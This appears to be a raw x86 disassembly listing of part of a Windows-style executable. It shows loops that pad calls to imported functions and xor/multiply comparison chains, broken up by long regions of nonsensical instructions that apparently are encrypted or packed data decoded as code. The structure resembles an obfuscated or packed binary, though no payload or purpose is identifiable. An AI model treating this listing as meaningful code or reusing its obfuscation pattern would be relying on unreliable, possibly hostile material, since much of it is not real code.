  403a0c:	or     ebx,DWORD PTR ds:0x43377b
  403a12:	inc    ebx
  403a13:	mov    DWORD PTR ds:0x43377b,ebx
  403a19:	cmp    DWORD PTR ds:0x43377b,0x25
  403a20:	jne    0x403a31
  403a26:	push   0x66db
  403a2b:	call   DWORD PTR ds:0x4120c0
  403a31:	cmp    DWORD PTR ds:0x43377b,0x1e
  403a38:	jb     0x403a0a
  403a3e:	add    edi,ecx
  403a40:	add    edx,ecx
  403a42:	mov    DWORD PTR ds:0x433857,0x19
  403a4c:	cmp    DWORD PTR ds:0x433857,0x0
  403a53:	je     0x403a80
  403a59:	cmp    DWORD PTR ds:0x433857,0x26
  403a60:	jne    0x403a6e
  403a66:	push   0x0
  403a68:	call   DWORD PTR ds:0x4120c4
  403a6e:	mov    ebx,DWORD PTR ds:0x433857
  403a74:	dec    ebx
  403a75:	mov    DWORD PTR ds:0x433857,ebx
  403a7b:	jmp    0x403a4c
  403a80:	imul   edx,edi
  403a83:	mov    edi,DWORD PTR [ebp-0x8]
  403a86:	and    DWORD PTR ds:0x43389b,ebx
  403a8c:	mov    ebx,DWORD PTR [ebp-0x10]
  403a8f:	sub    ebx,edi
  403a91:	cmp    ebx,edx
  403a93:	ja     0x403aa5
  403a99:	mov    edx,DWORD PTR [ebp-0x4]
  403a9c:	xor    edx,eax
  403a9e:	add    edx,ecx
  403aa0:	jmp    0x40478a
  403aa5:	mov    edx,DWORD PTR [ebp-0x2c]
  403aa8:	mov    edi,DWORD PTR [ebp-0x4]
  403aab:	xor    edx,eax
  403aad:	xor    edi,eax
  403aaf:	add    edi,ecx
  403ab1:	add    edx,ecx
  403ab3:	imul   edx,edi
  403ab6:	mov    edi,DWORD PTR [ebp-0x8]
  403ab9:	jmp    0x403dbc
  403abe:	pop    ebp
  403abf:	cli    
  403ac0:	mov    bh,0xac
  403ac2:	jno    0x403a75
  403ac4:	gs dec ebx
  403ac6:	or     BYTE PTR [edi],dl
  403ac8:	scas   al,BYTE PTR es:[edi]
  403ac9:	loopne 0x403aae
  403acb:	push   ss
  403acc:	int    0xff
  403ace:	and    BYTE PTR [eax],dl
  403ad0:	jle    0x403b50
  403ad2:	pop    eax
  403ad3:	jl     0x403b53
  403ad5:	jle    0x403a9f
  403ad7:	mov    dh,0x2d
  403ad9:	jno    0x403acd
  403adb:	mov    edi,0x91e2dd65
  403ae0:	cld    
  403ae1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403ae2:	xor    eax,0x6e79b59c
  403ae7:	nop
  403ae8:	rol    DWORD PTR [edi],1
  403aea:	jge    0x403aea
  403aec:	push   ebp
  403aed:	jg     0x403a8b
  403aef:	call   0x630f:0x36772edf
  403af6:	(bad)  
  403af7:	mov    BYTE PTR [esi],dh
  403af9:	rcr    dh,cl
  403afb:	scas   eax,DWORD PTR es:[edi]
  403afc:	jae    0x403abc
  403afe:	lahf   
  403aff:	and    DWORD PTR [ebx-0x17],esi
  403b02:	push   cs
  403b03:	cdq    
  403b04:	push   esp
  403b05:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  403b07:	cld    
  403b08:	inc    ebx
  403b09:	scas   eax,DWORD PTR es:[edi]
  403b0a:	push   es
  403b0b:	or     al,0x65
  403b0d:	push   0x5e
  403b0f:	add    BYTE PTR ds:[ecx],ah
  403b12:	add    BYTE PTR [ebx],bl
  403b14:	mov    esp,0xeb0c0156
  403b19:	iret   
  403b1a:	scas   eax,DWORD PTR es:[edi]
  403b1b:	jnp    0x403b42
  403b1d:	retf   
  403b1e:	inc    ebp
  403b1f:	addr16 mov al,ds:0x23b9
  403b23:	arpl   cx,bx
  403b25:	arpl   WORD PTR [esi+0xd4700e7],ax
  403b2b:	cli    
  403b2c:	mov    al,0xbd
  403b2e:	(bad)  
  403b2f:	inc    edx
  403b30:	loopne 0x403b9f
  403b32:	fild   DWORD PTR [edx+ebp*8+0x1f]
  403b36:	repz fsubp st(1),st
  403b39:	jae    0x403b87
  403b3b:	loop   0x403b35
  403b3d:	popa   
  403b3e:	imul   ebx,eax,0xa4462d06
  403b44:	add    bl,ah
  403b46:	add    eax,0x8a1cab73
  403b4b:	pushaw 
  403b4d:	les    esp,FWORD PTR [edx-0x69]
  403b50:	push   esi
  403b51:	pushf  
  403b52:	xor    DWORD PTR [ebx-0x49],0x60
  403b56:	cmc    
  403b57:	js     0x403b84
  403b59:	push   edi
  403b5a:	aas    
  403b5b:	and    edx,DWORD PTR [esi-0x3d9bfe79]
  403b61:	pop    ecx
  403b62:	and    BYTE PTR [ebp-0x6c1c1c13],ah
  403b68:	push   0x42
  403b6a:	dec    edx
  403b6b:	(bad)  
  403b6c:	imul   edx,esp,0xfbde0329
  403b72:	shl    BYTE PTR [eax+eax*1],1
  403b75:	enter  0x93fb,0x68
  403b79:	(bad)  
  403b7a:	enter  0xe111,0xcb
  403b7e:	pop    edx
  403b7f:	sub    al,BYTE PTR [eax+0x6c95f9dc]
  403b85:	clc    
  403b86:	add    al,0x79
  403b88:	sub    edi,0x1a58696b
  403b8e:	mov    al,ds:0x144dcbaf
  403b93:	jo     0x403b91
  403b95:	mov    ah,BYTE PTR [ebx+0x2cf4db83]
  403b9b:	mov    esp,0x527dd540
  403ba0:	mov    edx,0x837d3405
  403ba5:	fdivr  QWORD PTR [esi]
  403ba7:	sub    eax,0xe5d39802
  403bac:	push   ebx
  403bad:	jg     0x403b3c
  403baf:	sbb    al,0x57
  403bb1:	fcom   DWORD PTR [edx-0x1b]
  403bb4:	pop    ecx
  403bb5:	mov    ebx,0x714dd221
  403bba:	rol    ecx,0x6b
  403bbd:	pop    ds
  403bbe:	lods   eax,DWORD PTR ds:[esi]
  403bbf:	add    al,0x6a
  403bc1:	mov    ds:0x7d5b5a60,al
  403bc6:	cdq    
  403bc7:	rcl    al,0x41
  403bca:	mov    bl,0x78
  403bcc:	clc    
  403bcd:	inc    eax
  403bce:	call   0x700c2a3c
  403bd3:	repz mov ebx,0x89b72a55
  403bd9:	mov    al,ds:0xbe410e72
  403bde:	loop   0x403c08
  403be0:	jmp    0x403bfe
  403be2:	push   eax
  403be3:	push   esi
  403be4:	xchg   esi,eax
  403be5:	shr    BYTE PTR ds:[esi+edx*8],1
  403be9:	adc    ebx,DWORD PTR [eax-0x37]
  403bec:	jae    0x403c1e
  403bee:	aas    
  403bef:	jp     0x403b7b
  403bf1:	cmp    al,0x39
  403bf3:	call   0x92e6be6c
  403bf8:	mov    bl,0x50
  403bfa:	stos   BYTE PTR es:[edi],al
  403bfb:	push   0xe33f137
  403c00:	pop    ss
  403c01:	add    bh,BYTE PTR [ecx-0x6f]
  403c04:	push   ebp
  403c05:	cld    
  403c06:	loopne 0x403c4b
  403c08:	fwait
  403c09:	pop    esi
  403c0a:	mov    ah,0xf6
  403c0c:	icebp  
  403c0d:	out    dx,al
  403c0e:	aam    0xc0
  403c10:	dec    esp
  403c11:	inc    ecx
  403c12:	inc    eax
  403c13:	fwait
  403c14:	cmp    al,0x31
  403c16:	cld    
  403c17:	gs lahf 
  403c19:	xor    BYTE PTR [ecx-0x61],0x4e
  403c1d:	lea    eax,[ebp+0x7a]
  403c20:	and    dh,cl
  403c22:	inc    esp
  403c23:	dec    esi
  403c24:	popf   
  403c25:	cmp    eax,0x59729d06
  403c2a:	out    dx,eax
  403c2b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403c2c:	aad    0xfd
  403c2e:	loopne 0x403c96
  403c30:	adc    BYTE PTR [esi+0x8],cl
  403c33:	imul   ebp,ebp,0x50
  403c36:	sbb    ah,BYTE PTR [ecx+0x3da8134]
  403c3c:	sahf   
  403c3d:	pop    esp
  403c3e:	call   0xc5a9:0x3fe25e4d
  403c45:	mov    eax,0x5d261c7a
  403c4a:	jge    0x403c5e
  403c4c:	jne    0x403c9f
  403c4e:	jo     0x403c96
  403c50:	icebp  
  403c51:	shr    ah,cl
  403c53:	aaa    
  403c54:	inc    DWORD PTR ds:0x59c936c7
  403c5a:	push   ecx
  403c5b:	fistp  WORD PTR [ebp-0x5523841c]
  403c61:	gs pop ds
  403c63:	or     ebp,edx
  403c65:	inc    ebp
  403c66:	push   0x4b243695
  403c6b:	or     BYTE PTR [esi-0x40],0xd5
  403c6f:	mov    edx,0xc347f61f
  403c74:	ds jecxz 0x403c27
  403c77:	adc    bh,BYTE PTR [ecx+0x4e01aaad]
  403c7d:	call   0xca869a4f
  403c82:	add    BYTE PTR [esi-0x2cc6fe68],ah
  403c88:	adc    ecx,esp
  403c8a:	push   eax
  403c8b:	or     BYTE PTR [ecx+0x60c036fd],0x52
  403c92:	sub    DWORD PTR [ecx+0x59],ebp
  403c95:	mov    edi,0xf2f956ea
  403c9a:	xchg   ebp,eax
  403c9b:	ins    DWORD PTR es:[edi],dx
  403c9c:	xor    BYTE PTR [ebx],dh
  403c9e:	enter  0x62bf,0x17
  403ca2:	cmp    ebp,DWORD PTR [ecx+0x74b52291]
  403ca8:	das    
  403ca9:	sar    BYTE PTR [ebp+0x5b],cl
  403cac:	push   ebx
  403cad:	rcl    DWORD PTR [eax-0x4d9de9fe],1
  403cb3:	adc    DWORD PTR [ebx],edx
  403cb5:	xor    cl,bl
  403cb7:	outs   dx,DWORD PTR ds:[esi]
  403cb8:	daa    
  403cb9:	xchg   ebp,eax
  403cba:	pop    ebp
  403cbb:	sbb    eax,edx
  403cbd:	clc    
  403cbe:	xor    DWORD PTR [ebp+0x4f],0x46690a1e
  403cc5:	mov    bh,BYTE PTR [edi]
  403cc7:	push   es
  403cc8:	mov    al,0x83
  403cca:	dec    edx
  403ccb:	and    al,0xa3
  403ccd:	inc    esp
  403cce:	mov    cl,0xba
  403cd0:	and    al,0x6e
  403cd2:	enter  0x9723,0x5e
  403cd6:	and    ecx,DWORD PTR [edi-0x6649380b]
  403cdc:	dec    eax
  403cdd:	jno    0x403c88
  403cdf:	sti    
  403ce0:	pop    esp
  403ce1:	xor    BYTE PTR [ebp-0x48],bh
  403ce4:	xor    dh,al
  403ce6:	mov    BYTE PTR [ecx+0x7fc87558],cl
  403cec:	sbb    BYTE PTR [eax-0x2ba38d6d],ah
  403cf2:	retf   0xc1cf
  403cf5:	mov    bl,0x3e
  403cf7:	lock test al,0x76
  403cfa:	adc    DWORD PTR [edi-0x10],ecx
  403cfd:	and    al,0x72
  403cff:	add    al,0xac
  403d01:	shr    BYTE PTR [edx+ebx*2],cl
  403d04:	enter  0x1f39,0xad
  403d08:	push   edx
  403d09:	push   esi
  403d0a:	push   eax
  403d0b:	push   es
  403d0c:	mov    cl,0x9a
  403d0e:	xchg   ebx,eax
  403d0f:	loope  0x403d75
  403d11:	inc    eax
  403d12:	pusha  
  403d13:	mov    ds:0x21c542a,al
  403d18:	aam    0x20
  403d1a:	pop    ebp
  403d1b:	xchg   BYTE PTR [edx+0x21],dh
  403d1e:	push   esi
  403d1f:	les    ebx,FWORD PTR ds:0xd30e8f8e
  403d25:	sub    al,0x3a
  403d27:	or     ebx,esp
  403d29:	sub    ebp,DWORD PTR [edx-0x6d0c9088]
  403d2f:	sbb    BYTE PTR [ebp-0x10902e85],cl
  403d35:	xlat   BYTE PTR ds:[ebx]
  403d36:	push   0xbcfa16a9
  403d3b:	pop    ecx
  403d3c:	mov    BYTE PTR [edx*2+0x4cbb8439],bh
  403d43:	retf   
  403d44:	call   ebp
  403d46:	pop    ss
  403d47:	test   eax,0x12b1a978
  403d4c:	inc    ebp
  403d4d:	sub    esi,DWORD PTR [ebp-0x31c74a38]
  403d53:	or     al,0x11
  403d55:	stos   BYTE PTR es:[edi],al
  403d56:	mov    dl,0xbf
  403d58:	in     al,dx
  403d59:	pop    es
  403d5a:	and    DWORD PTR [ebp+esi*4+0x67322884],esi
  403d61:	xor    dh,BYTE PTR [edi+0x6daf5834]
  403d67:	fs fs daa 
  403d6a:	adc    DWORD PTR [edi],esi
  403d6c:	les    ecx,FWORD PTR [ebx+0x2d100ec9]
  403d72:	outs   dx,DWORD PTR ds:[esi]
  403d73:	sahf   
  403d74:	fs cld 
  403d76:	loop   0x403dc9
  403d78:	cmp    al,BYTE PTR [esi]
  403d7a:	repz pause 
  403d7d:	mov    bl,BYTE PTR [eax-0x8]
  403d80:	xchg   esp,eax
  403d81:	imul   edx,DWORD PTR [ecx],0xffffffca
  403d84:	sub    ebx,edx
  403d86:	jmp    0x301de16c
  403d8b:	mov    ebx,0x3b7cee4d
  403d90:	cmp    ecx,DWORD PTR [esi+esi*4-0x7c928e6f]
  403d97:	cmp    ecx,DWORD PTR [ecx-0x24eb059]
  403d9d:	cs sbb eax,0x47032fe6
  403da3:	dec    eax
  403da4:	(bad)  
  403da5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403da6:	test   BYTE PTR [esi-0xe],dl
  403da9:	push   ds
  403daa:	add    BYTE PTR [eax+0x16],bh
  403dad:	inc    esi
  403dae:	mov    ds:0xaabd49ae,eax
  403db3:	pop    esi
  403db4:	xor    ch,bl
  403db6:	jge    0x403d5a
  403db8:	in     al,0x4d
  403dba:	adc    esp,DWORD PTR [esi+0x2bf05d8b]
  403dc0:	fistp  QWORD PTR [ebx]
  403dc2:	fimul  DWORD PTR [edi]
  403dc4:	xchg   DWORD PTR [eax],ecx
  403dc6:	add    BYTE PTR [eax],al
  403dc8:	add    BYTE PTR [ebx-0x5a1627ab],cl
  403dce:	add    eax,DWORD PTR [eax]
  403dd0:	add    BYTE PTR [ebx+0x7d8bd055],cl
  403dd6:	cld    
  403dd7:	xor    edx,eax
  403dd9:	xor    edi,eax
  403ddb:	add    edi,ecx
  403ddd:	add    edx,ecx
  403ddf:	imul   edx,edi
  403de2:	mov    edi,DWORD PTR [ebp-0x8]
  403de5:	mov    ebx,DWORD PTR [ebp-0x10]
  403de8:	sub    ebx,edi
  403dea:	cmp    ebx,edx
  403dec:	ja     0x403dfa
  403df2:	mov    edx,DWORD PTR [ebp-0x2c]
  403df5:	jmp    0x404176
  403dfa:	mov    edx,DWORD PTR [ebp-0x34]
  403dfd:	mov    edi,DWORD PTR [ebp-0x4]
  403e00:	xor    edx,eax
  403e02:	xor    edi,eax
  403e04:	add    edi,ecx
  403e06:	add    edx,ecx
  403e08:	imul   edx,edi
  403e0b:	mov    edi,DWORD PTR [ebp-0x8]
  403e0e:	mov    ebx,DWORD PTR [ebp-0x10]
  403e11:	sub    ebx,edi
  403e13:	cmp    ebx,edx
  403e15:	ja     0x403e23
  403e1b:	mov    edx,DWORD PTR [ebp-0x30]
  403e1e:	jmp    0x404176
  403e23:	mov    edx,DWORD PTR [ebp-0x38]
  403e26:	mov    edi,DWORD PTR [ebp-0x4]
  403e29:	xor    edx,eax
  403e2b:	xor    edi,eax
  403e2d:	add    edi,ecx
  403e2f:	add    edx,ecx
  403e31:	imul   edx,edi
  403e34:	mov    edi,DWORD PTR [ebp-0x8]
  403e37:	mov    ebx,DWORD PTR [ebp-0x10]
  403e3a:	sub    ebx,edi
  403e3c:	cmp    ebx,edx
  403e3e:	ja     0x403e4c
  403e44:	mov    edx,DWORD PTR [ebp-0x34]
  403e47:	jmp    0x404176
  403e4c:	mov    edx,DWORD PTR [ebp-0x3c]
  403e4f:	mov    edi,DWORD PTR [ebp-0x4]
  403e52:	xor    edx,eax
  403e54:	xor    edi,eax
  403e56:	add    edx,ecx
  403e58:	add    edi,ecx
  403e5a:	imul   edx,edi
  403e5d:	mov    edi,DWORD PTR [ebp-0x8]
  403e60:	mov    ebx,DWORD PTR [ebp-0x10]
  403e63:	jmp    0x404166
  403e68:	mov    dh,0x45
  403e6a:	xchg   edi,eax
  403e6b:	xor    BYTE PTR [ebp+0x50],0xb1
  403e6f:	jno    0x403e18
  403e71:	(bad)  
  403e72:	cs push 0xffffffe5
  403e75:	cmp    BYTE PTR [ecx+ebp*8+0x7e7e1f0a],al
  403e7c:	pop    eax
  403e7d:	jl     0x403efd
  403e7f:	jle    0x403e96
  403e81:	sbb    DWORD PTR [eax],ecx
  403e83:	xorps  xmm7,XMMWORD PTR [ecx]
  403e86:	stc    
  403e87:	or     al,0x7e
  403e89:	(bad)  
  403e8a:	rcr    BYTE PTR [ecx+0x46c25c03],1
  403e90:	mov    ah,0xec
  403e92:	dec    ebp
  403e93:	aas    
  403e94:	shr    al,cl
  403e96:	stc    
  403e97:	push   esp
  403e98:	mov    ds:0xaa50376f,eax
  403e9d:	jg     0x403e91
  403e9f:	adc    eax,0xb3dad2b8
  403ea4:	aam    0xb1
  403ea6:	push   ebx
  403ea7:	bound  ebx,QWORD PTR [edx+ebp*1]
  403eaa:	sbb    ecx,esi
  403eac:	fwait
  403ead:	push   ds
  403eae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403eaf:	test   eax,0xba1d940d
  403eb4:	int    0x7b
  403eb6:	ficom  WORD PTR [edx-0x6e210d2e]
  403ebc:	mov    ?,WORD PTR [esi+0x41]
  403ebf:	retf   0xc1a2
  403ec2:	sbb    ebx,DWORD PTR [ebp-0x1a]
  403ec5:	call   0xb46ae2e
  403eca:	pop    ebx
  403ecb:	clc    
  403ecc:	xchg   esp,eax
  403ecd:	xor    BYTE PTR [ecx-0x4f905b25],ch
  403ed3:	cmp    al,0x89
  403ed5:	cmp    ch,BYTE PTR [edx]
  403ed7:	inc    edx
  403ed8:	xor    DWORD PTR [esi],esp
  403eda:	and    sp,WORD PTR [edx]
  403edd:	sbb    eax,0x6882b761
  403ee2:	adc    ah,BYTE PTR ds:0x5c564a0c
  403ee8:	in     al,0x6
  403eea:	pop    ecx
  403eeb:	in     eax,dx
  403eec:	sbb    DWORD PTR ds:0x75997884,edx
  403ef2:	(bad)
  403ef5:	aad    0x3f
  403ef7:	ds and al,0x5a
  403efa:	mov    BYTE PTR [ebx+0x18e5b94],0xe6
  403f01:	add    DWORD PTR [eax+0x25a6a02f],0x5b
  403f08:	push   es
  403f09:	mov    ah,0xe9
  403f0b:	lock test DWORD PTR [esi+0x3501f5f2],ecx
  403f12:	xor    dh,BYTE PTR [esi-0x7d]
  403f15:	ret    
  403f16:	or     ch,BYTE PTR [ecx]
  403f18:	xchg   ebp,eax
  403f19:	lahf   
  403f1a:	adc    DWORD PTR [edx+0x5c017e19],ebx
  403f20:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403f21:	adc    BYTE PTR [ebx-0x26cc998a],ah
  403f27:	(bad)  
  403f28:	xor    eax,0x8e8132ee
  403f2d:	popa   
  403f2e:	ss mov dh,0x36
  403f31:	push   es
  403f32:	lods   al,BYTE PTR ds:[esi]
  403f33:	mov    ds:0xa0686a85,eax
  403f38:	dec    edx
  403f39:	cmp    bh,BYTE PTR [esi+0x445a23c5]
  403f3f:	cs jmp 0x403fb6
  403f42:	sbb    DWORD PTR [ecx],0xffffffe3
  403f45:	stos   BYTE PTR es:[edi],al
  403f46:	dec    ecx
  403f47:	pop    es
  403f48:	mov    bh,0x1
  403f4a:	push   edx
  403f4b:	mov    eax,ds:0x7a37a4d4
  403f50:	shr    edi,0x54
  403f53:	aaa    
  403f54:	mov    eax,DWORD PTR [edx-0x17]
  403f57:	jp     0x403faf
  403f59:	cdq    
  403f5a:	xchg   BYTE PTR [eax],dh
  403f5c:	out    dx,al
  403f5d:	sub    DWORD PTR [eax-0x6c],esi
  403f60:	cmovne ebp,edx
  403f63:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403f64:	pop    esp
  403f65:	push   esp
  403f66:	scas   eax,DWORD PTR es:[edi]
  403f67:	data16 adc ch,BYTE PTR [eax]
  403f6a:	dec    esi
  403f6b:	inc    eax
  403f6c:	test   dh,ah
  403f6e:	push   ds
  403f6f:	retf   
  403f70:	inc    ebx
  403f71:	push   edi
  403f72:	fwait
  403f73:	retf   
  403f74:	push   edx
  403f75:	mov    esp,0x6d5d0174
  403f7a:	(bad)  
  403f7b:	cmc    
  403f7c:	and    BYTE PTR [ebp-0x4bc6592a],bl
  403f82:	std    
  403f83:	push   ss
  403f84:	cmc    
  403f85:	push   edx
  403f86:	jae    0x403fd3
  403f88:	fdiv   DWORD PTR [edi+0x25857b85]
  403f8e:	cmp    BYTE PTR [ebp-0x28],0xf7
  403f92:	shr    BYTE PTR [ecx+eax*1],1
  403f95:	jb     0x403ff7
  403f97:	hlt    
  403f98:	or     al,0xe8
  403f9a:	mov    DWORD PTR [ecx],esi
  403f9c:	icebp  
  403f9d:	add    dh,ch
  403f9f:	out    dx,al
  403fa0:	xor    al,0x59
  403fa2:	popa   
  403fa3:	addr16 or ebp,edi
  403fa6:	xchg   ebx,eax
  403fa7:	push   esi
  403fa8:	fimul  WORD PTR [ebp+0x1b]
  403fab:	cmp    al,0x12
  403fad:	icebp  
  403fae:	dec    edx
  403faf:	ror    dh,0xd3
  403fb2:	cmp    eax,0x21864c0
  403fb7:	into   
  403fb8:	call   esp
  403fba:	adc    eax,ebx
  403fbc:	xor    ebx,DWORD PTR [edx-0x68]
  403fbf:	and    DWORD PTR [edx+0x4340325f],edi
  403fc5:	fiadd  WORD PTR ds:0x7d717719
  403fcb:	loope  0x403fa9
  403fcd:	add    eax,0x3148da5a
  403fd2:	in     eax,0x38
  403fd4:	ja     0x403f81
  403fd6:	leave  
  403fd7:	sbb    eax,0x1c245676
  403fdc:	dec    edx
  403fdd:	popa   
  403fde:	mov    ecx,0x489af864
  403fe3:	es out dx,eax
  403fe5:	mov    eax,ds:0x1c955e40
  403fea:	cmp    ah,bl
  403fec:	outs   dx,BYTE PTR ds:[esi]
  403fed:	enter  0x74ff,0xff
  403ff1:	aam    0x48
  403ff3:	xor    eax,0xe9320386
  403ff8:	xor    al,0xf2
  403ffa:	and    al,0xc5
  403ffc:	adc    edx,DWORD PTR [ebx-0x67340309]
  404002:	cdq    
  404003:	ret    
  404004:	aam    0x13
  404006:	pop    edi
  404007:	mov    esi,0x61f7cb5a
  40400c:	jp     0x403fb8
  40400e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40400f:	in     eax,dx
  404010:	popf   
  404011:	neg    DWORD PTR [esi+0x501cc07e]
  404017:	push   cs
  404018:	mov    ah,0xef
  40401a:	in     eax,0x31
  40401c:	pop    ss
  40401d:	cmp    edi,DWORD PTR [ebx]
  40401f:	scas   al,BYTE PTR es:[edi]
  404020:	fisubr WORD PTR [esi-0x51]
  404023:	mov    ds,eax
  404025:	retf   
  404026:	push   sp
  404028:	pop    edi
  404029:	jge    0x404041
  40402b:	retf   
  40402c:	sub    eax,0x9c2c5b8c
  404031:	dec    ecx
  404032:	mov    edx,0x1f33c6c4
  404037:	shl    ecx,cl
  404039:	mov    DWORD PTR [ebx+0x4a],ebp
  40403c:	mov    esp,0x48f8f4bf
  404041:	jge    0x4040b2
  404043:	cmc    
  404044:	test   DWORD PTR [edi+0x1a],0x79363b14
  40404b:	inc    ecx
  40404c:	cmp    al,0x2
  40404e:	and    BYTE PTR [ebx+0x75b1600d],ch
  404054:	pop    edx
  404055:	lods   al,BYTE PTR ds:[esi]
  404056:	mov    BYTE PTR [edi+edi*1+0x37c4c4fb],bl
  40405d:	adc    edi,DWORD PTR [edi]
  40405f:	daa    
  404060:	jae    0x404013
  404062:	ins    BYTE PTR es:[edi],dx
  404063:	or     al,BYTE PTR [eax-0x65c65c35]
  404069:	sbb    ah,BYTE PTR [edx]
  40406b:	gs out dx,eax
  40406d:	lock sbb DWORD PTR [ebx+0x25],ebp
  404071:	popf   
  404072:	add    ah,ch
  404074:	sub    al,BYTE PTR [ebx-0x64be51b3]
  40407a:	fwait
  40407b:	mov    ch,0x7
  40407d:	dec    ecx
  40407e:	xor    DWORD PTR [edi+0x44],esp
  404081:	adc    eax,0xa65e2dd0
  404086:	jle    0x4040c9
  404088:	inc    eax
  404089:	lock mov edx,0x3beec087
  40408f:	pop    esi
  404090:	rol    dl,1
  404092:	in     eax,dx
  404093:	jle    0x4040f2
  404095:	rcr    DWORD PTR [edx-0x52],cl
  404098:	xchg   edx,eax
  404099:	repz enter 0xe387,0xf5
  40409e:	dec    eax
  40409f:	dec    esp
  4040a0:	popf   
  4040a1:	repnz test DWORD PTR [edx],ebx
  4040a4:	in     al,dx
  4040a5:	mov    eax,0xaa4f912c
  4040aa:	cwde   
  4040ab:	daa    
  4040ac:	cmp    eax,0xe5698527
  4040b1:	arpl   cx,bx
  4040b3:	lock sub ah,BYTE PTR [ebp-0xe]
  4040b7:	stos   BYTE PTR es:[edi],al
  4040b8:	retf   0xbad5
  4040bb:	(bad)  
  4040bc:	and    eax,0xd671c79c
  4040c1:	or     eax,0x333b21a2
  4040c6:	nop
  4040c7:	inc    eax
  4040c8:	imul   edx,DWORD PTR [ecx+0x1621393b],0xffffff8b
  4040cf:	pop    esp
  4040d0:	fs ins DWORD PTR es:[edi],dx
  4040d2:	ins    BYTE PTR es:[edi],dx
  4040d3:	je     0x40408d
  4040d5:	das    
  4040d6:	or     DWORD PTR [ebx],eax
  4040d8:	sbb    BYTE PTR [edx+0x38],ah
  4040db:	in     eax,0x2c
  4040dd:	pop    ebx
  4040de:	pop    ss
  4040df:	push   ebp
  4040e0:	pop    es
  4040e1:	or     BYTE PTR [eax],bl
  4040e3:	jmp    0x61fc9bd6
  4040e8:	sub    ch,bl
  4040ea:	not    DWORD PTR [edi+0x584ed1f]
  4040f0:	add    DWORD PTR [edi],0x10
  4040f3:	cmp    eax,0xdf38dcaf
  4040f8:	jmp    0x6f47bc5c
  4040fd:	fld    TBYTE PTR [eax+0xb4b8d3a]
  404103:	or     eax,0xdcb950d9
  404108:	push   edx
  404109:	lods   eax,DWORD PTR ds:[esi]
  40410a:	or     eax,0xf800b353
  40410f:	pop    eax
  404110:	and    edi,DWORD PTR [ebx]
  404112:	push   0x1b019436
  404117:	push   edi
  404118:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404119:	xlat   BYTE PTR ds:[ebx]
  40411a:	sbb    al,0xcf
  40411c:	clc    
  40411d:	mov    ebp,0x6a9f98c8
  404122:	inc    esp
  404123:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404124:	popf   
  404125:	std    
  404126:	mov    esp,0xaf6ec93
  40412b:	imul   ebp,DWORD PTR [eax],0xa3971852
  404131:	lods   al,BYTE PTR ds:[esi]
  404132:	das    
  404133:	mov    dl,0xe6
  404135:	leave  
  404136:	mov    ch,dh
  404138:	pop    ds
  404139:	out    dx,al
  40413a:	push   ds
  40413b:	out    0x4e,al
  40413d:	xor    edx,DWORD PTR ds:0xfbdcaaf5
  404143:	dec    edx
  404144:	cwde   
  404145:	cld    
  404146:	aad    0x1
  404148:	cmp    dl,bh
  40414a:	dec    ecx
  40414b:	fmul   DWORD PTR [ecx*8+0x16a8fc3d]
  404152:	inc    eax
  404153:	pop    edx
  404154:	jnp    0x404165
  404156:	mov    ds:0xc70cba7c,al
  40415b:	(bad)  
  40415d:	movsx  ebp,WORD PTR [eax-0x10ec8b3b]
  404164:	jbe    0x404164
  404166:	sub    ebx,edi
  404168:	cmp    ebx,edx
  40416a:	mov    edx,DWORD PTR [ebp-0x38]
  40416d:	jbe    0x404176
  404173:	mov    edx,DWORD PTR [ebp-0x3c]
  404176:	mov    edi,DWORD PTR [ebp-0x4]
  404179:	jmp    0x40447c
  40417e:	mov    al,0x3b
  404180:	aaa    
  404181:	or     BYTE PTR [ebp-0x10],dh
  404184:	mov    cl,0x63
  404186:	sub    DWORD PTR [edi],0xffffffd4
  404189:	xor    BYTE PTR [edx+0xc],ch
  40418c:	mov    al,0x47
  40418e:	je     0x4041ad
  404190:	jle    0x404210
  404192:	pop    eax
  404193:	jl     0x404213
  404195:	jle    0x4041d2
  404197:	xchg   edi,eax
  404198:	int    0x49
  40419a:	and    eax,0x2a33b0bd
  40419f:	inc    ecx
  4041a0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4041a1:	adc    DWORD PTR [ebx-0x61250e14],ebp
  4041a7:	push   edx
  4041a8:	xchg   edx,eax
  4041a9:	std    
  4041aa:	xor    ecx,DWORD PTR [ecx+0x32]
  4041ad:	sar    BYTE PTR [ecx-0x754a697d],cl
  4041b3:	mov    dh,0x34
  4041b5:	fldenv [ebx+esi*2+0x52672dbf]
  4041bc:	pop    edi
  4041bd:	cs in  eax,dx
  4041bf:	js     0x4041bd
  4041c1:	or     DWORD PTR [ebx-0x621382a1],0xff45b0a9
  4041cb:	mov    ebp,0x614b20ca
  4041d0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4041d1:	fimul  WORD PTR [eax]
  4041d3:	out    0xee,al
  4041d5:	jmp    0xb27600b9
  4041da:	jmp    0x4041af
  4041dc:	mov    ebp,0x358d9eac
  4041e1:	xchg   edi,eax
  4041e2:	mov    ds:0x6ba625ed,eax
  4041e7:	pop    ds
  4041e8:	(bad)  
  4041e9:	mov    edx,0xc2b2188c
  4041ee:	pop    es
  4041ef:	add    BYTE PTR [edx+0x6c],0xc5
  4041f3:	test   eax,0xd6e205a8
  4041f8:	jle    0x404279
  4041fa:	pop    ebx
  4041fb:	xchg   ebx,eax
  4041fc:	lahf   
  4041fd:	lea    eax,ds:0x872867c7
  404203:	adc    eax,0xd5dfbd8a
  404208:	fwait
  404209:	cld    
  40420a:	adc    BYTE PTR [edx+0x25],ch
  40420d:	outs   dx,BYTE PTR ds:[esi]
  40420e:	lock pop ds
  404210:	pushf  
  404211:	lea    ebx,[ebx-0x19]
  404214:	mov    dh,0xf8
  404216:	sbb    eax,DWORD PTR [ecx+0x55]
  404219:	pushf  
  40421a:	jne    0x40425c
  40421c:	inc    eax
  40421d:	test   al,0xbe
  40421f:	imul   esi,DWORD PTR [ebp*2+0x43793b4b],0x35cc47bd
  40422a:	jno    0x4041f4
  40422c:	sbb    ch,BYTE PTR fs:[ecx]
